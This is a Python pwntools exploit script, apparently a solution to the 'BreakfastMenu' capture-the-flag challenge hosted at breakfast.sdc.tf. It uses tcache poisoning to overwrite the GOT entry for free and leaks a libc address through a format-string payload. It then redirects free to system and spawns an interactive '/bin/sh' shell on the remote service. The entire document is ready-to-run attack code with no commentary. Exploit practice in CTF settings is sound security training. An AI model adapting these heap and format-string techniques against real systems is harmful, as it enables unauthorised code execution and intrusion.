from pwn import *

libc = ELF('./libc-2.27.so')
elf = ELF('./BreakfastMenu_patched')
# p = elf.process()
p = remote('breakfast.sdc.tf', 1337)

def add():
	p.sendlineafter(b'4. Pay your bill and leave\n', b'1')

def edit(idx, data):
	p.sendlineafter(b'4. Pay your bill and leave\n', b'2')
	p.sendlineafter(b'\n', str(idx).encode('ascii'))
	p.sendlineafter(b'What would you like to order?\n', data)

def free(idx):
	p.sendlineafter(b'4. Pay your bill and leave\n', b'3')
	p.sendlineafter(b'\n', str(idx).encode('ascii'))

add()
add()
free(0)
free(1)
edit(1, p64(elf.got.free - 8))
add()
add()
edit(2, b'%11$p')

edit(3, b'a'*8 + p64(elf.sym.printf))
free(2)

libc.address = int(p.recvline()[:-1], 16) - 0x21c87
print(hex(libc.address))

system = libc.sym.system

edit(3, b'a'*8 + p64(system))
edit(2, b'/bin/sh\x00')

free(2)

p.interactive()